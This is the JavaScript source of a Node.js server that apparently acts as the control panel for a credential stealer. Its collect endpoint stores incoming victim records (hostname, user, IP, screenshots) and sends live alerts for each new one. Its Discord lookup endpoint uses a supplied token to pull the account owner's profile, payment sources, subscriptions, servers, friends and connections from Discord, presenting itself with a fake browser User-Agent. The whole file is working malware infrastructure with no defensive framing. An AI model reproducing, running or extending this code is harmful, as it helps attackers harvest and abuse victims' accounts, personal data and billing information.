const http = require('http')
const https = require('https')
const fs = require('fs')
const path = require('path')
const url = require('url')

const PORT = process.env.PANEL_PORT || 3456
const PUBDIR = path.join(__dirname, 'public')
const DATADIR = path.join(__dirname, 'data')
if (!fs.existsSync(DATADIR)) fs.mkdirSync(DATADIR, { recursive: true })

let clients = []
let sseconns = []

for (const f of fs.readdirSync(DATADIR).filter(f => f.endsWith('.json'))) {
  try {
    const c = JSON.parse(fs.readFileSync(path.join(DATADIR, f), 'utf8'))
    clients.push(c)
  } catch (e) {}
}

const mimes = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.png': 'image/png',
  '.json': 'application/json',
  '.ico': 'image/x-icon'
}

function ssebroadcast(event, data) {
  const msg = `event: ${event}\ndata: ${JSON.stringify(data)}\n\n`
  for (const res of sseconns) {
    try { res.write(msg) } catch (e) {}
  }
  sseconns = sseconns.filter(r => !r.destroyed)
}

function servefile(res, fpath) {
  const ext = path.extname(fpath)
  try {
    res.writeHead(200, { 'Content-Type': mimes[ext] || 'application/octet-stream' })
    res.end(fs.readFileSync(fpath))
  } catch (e) {
    res.writeHead(404)
    res.end()
  }
}

const server = http.createServer((req, res) => {
  const parsed = url.parse(req.url, true)
  const method = req.method

  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, DELETE')

  if (method === 'OPTIONS') { res.writeHead(200); res.end(); return }

  if (parsed.pathname === '/api/sse') {
    res.writeHead(200, {
      'Content-Type': 'text/event-stream',
      'Cache-Control': 'no-cache',
      'Connection': 'keep-alive'
    })
    res.write('event: connected\ndata: {}\n\n')
    sseconns.push(res)
    req.on('close', () => {
      sseconns = sseconns.filter(r => r !== res)
    })
    return
  }

  if (method === 'POST' && parsed.pathname === '/api/collect') {
    let body = ''
    req.on('data', chunk => body += chunk)
    req.on('end', () => {
      try {
        const data = JSON.parse(body)
        data.id = data.hostname + '_' + data.user + '_' + Date.now()
        data.time = new Date().toISOString()
        clients.push(data)
        fs.writeFileSync(path.join(DATADIR, data.id + '.json'), JSON.stringify(data, null, 2))
        ssebroadcast('newclient', { id: data.id, hostname: data.hostname, user: data.user, ip: data.ip, time: data.time, has_ss: !!data.screenshot })
        res.writeHead(200, { 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ ok: true, id: data.id }))
      } catch (e) {
        res.writeHead(400, { 'Content-Type': 'application/json' })
        res.end(JSON.stringify({ ok: false, error: e.message }))
      }
    })
    return
  }

  if (parsed.pathname === '/api/clients') {
    const list = clients.map(c => ({
      id: c.id, hostname: c.hostname, user: c.user, ip: c.ip, time: c.time, has_ss: !!c.screenshot
    })).reverse()
    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end(JSON.stringify(list))
    return
  }

  if (parsed.pathname.startsWith('/api/client/')) {
    const id = parsed.pathname.replace('/api/client/', '')
    const c = clients.find(x => x.id === id)
    if (c) {
      res.writeHead(200, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify(c))
    } else {
      res.writeHead(404, { 'Content-Type': 'application/json' })
      res.end(JSON.stringify({ error: 'not found' }))
    }
    return
  }

  if (parsed.pathname.startsWith('/api/delete/')) {
    const id = parsed.pathname.replace('/api/delete/', '')
    clients = clients.filter(c => c.id !== id)
    try { fs.unlinkSync(path.join(DATADIR, id + '.json')) } catch (e) {}
    ssebroadcast('deleted', { id })
    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end(JSON.stringify({ ok: true }))
    return
  }

  if (parsed.pathname.startsWith('/api/clearlog')) {
    clients = []
    for (const f of fs.readdirSync(DATADIR).filter(f => f.endsWith('.json'))) {
      try { fs.unlinkSync(path.join(DATADIR, f)) } catch (e) {}
    }
    ssebroadcast('cleared', {})
    res.writeHead(200, { 'Content-Type': 'application/json' })
    res.end(JSON.stringify({ ok: true }))
    return
  }

  if (method === 'POST' && parsed.pathname === '/api/discord/lookup') {
    let body = ''
    req.on('data', c => body += c)
    req.on('end', () => {
      try {
        const { token } = JSON.parse(body)
        if (!token) { res.writeHead(400); res.end(JSON.stringify({ error: 'token required' })); return }
        let done = 0, result = {}, hasError = false
        function apiget(endpoint, key) {
          return new Promise(resolve => {
            const opts = { hostname: 'discord.com', path: endpoint, method: 'GET', headers: { 'Authorization': token, 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36' } }
            const r = https.request(opts, (res) => { let d = ''; res.on('data', c => d += c); res.on('end', () => { try { result[key] = JSON.parse(d) } catch(e) { result[key] = d }; resolve() }) })
            r.on('error', () => { result[key] = null; resolve() })
            r.setTimeout(8000, () => { r.destroy(); result[key] = null; resolve() })
            r.end()
          })
        }
        Promise.all([
          apiget('/api/v9/users/@me', 'user'),
          apiget('/api/v9/users/@me/billing/payment-sources', 'billing'),
          apiget('/api/v9/users/@me/guilds', 'guilds'),
          apiget('/api/v9/users/@me/relationships', 'friends'),
          apiget('/api/v9/users/@me/channels', 'channels'),
          apiget('/api/v9/users/@me/connections', 'connections'),
          apiget('/api/v9/users/@me/billing/subscriptions', 'subscriptions')
        ]).then(() => {
          if (result.user && result.user.id) {
            res.writeHead(200, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ ok: true, data: result }))
          } else {
            res.writeHead(200, { 'Content-Type': 'application/json' })
            res.end(JSON.stringify({ ok: false, error: result.user ? (result.user.message || 'invalid token') : 'invalid token' }))
          }
        })
      } catch (e) { res.writeHead(400); res.end(JSON.stringify({ error: e.message })) }
    })
    return
  }

  let fpath = path.join(PUBDIR, parsed.pathname === '/' ? 'index.html' : parsed.pathname)
  if (fs.existsSync(fpath) && fs.statSync(fpath).isFile()) {
    servefile(res, fpath)
  } else {
    servefile(res, path.join(PUBDIR, 'index.html'))
  }
})

server.listen(PORT, () => {
  console.log('panel: http://localhost:' + PORT)
})
